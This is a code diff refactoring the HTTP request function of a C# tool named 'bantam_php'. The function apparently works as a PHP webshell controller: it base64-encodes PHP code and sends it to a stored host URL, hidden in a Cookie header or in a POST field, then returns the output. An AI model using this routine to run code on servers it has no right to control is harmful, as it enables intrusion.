@@ -15,7 +15,7 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public string g_GlobalDefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0";
+        public static string g_GlobalDefaultUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0";
 
         private static readonly HttpClient client = new HttpClient(new HttpClientHandler() { UseCookies = false });
 
@@ -24,57 +24,40 @@ namespace bantam_php
             string requestArgsName = BantamMain.Hosts[url].RequestArgName;
             bool sendViaCookie = BantamMain.Hosts[url].SendDataViaCookie;
 
-            //var response = await client.PostAsync(url, content);
-            //var responseString = await response.Content.ReadAsStringAsync();
-            //return responseString;
-
-            try
-            {
+            try {
                 HttpMethod method;
-                if (sendViaCookie)
-                {
+                if (sendViaCookie) {
                     method = HttpMethod.Get;
-                }
-                else
-                {
+                } else {
                     method = HttpMethod.Post;
                 }
 
                 var request = new HttpRequestMessage(method, url);
-
                 var httpClient = new HttpClient();
 
-                if (!string.IsNullOrEmpty(code))
-                {
+                if (!string.IsNullOrEmpty(code)) {
                     string minifiedCode = PhpHelper.minifyCode(code);
                     string encodedCode = HttpUtility.UrlEncode(minifiedCode);
                     var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(encodedCode);
                     string b64 = System.Convert.ToBase64String(plainTextBytes);
 
-                    var values = new Dictionary<string, string>
-                    {
-                       { requestArgsName, b64 }
-                    };
-
-                    var content = new FormUrlEncodedContent(values);
-
-
-                    if (sendViaCookie)
-                    {
+                    if (sendViaCookie) {
                         request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + b64);
-                    } else
-                    {
+                    } else {
+                        var values = new Dictionary<string, string>
+                        {
+                           { requestArgsName, b64 }
+                        };
+
+                        var content = new FormUrlEncodedContent(values);
                         request.Content = content;
                     }
                 }
 
                 var response = await client.SendAsync(request);
                 var responseString = await response.Content.ReadAsStringAsync();
-                string data = responseString;
-                return data;
-            }
-            catch(System.Net.Http.HttpRequestException e)
-            {
+                return responseString;
+            } catch (System.Net.Http.HttpRequestException e) {
 
             }
             return "";
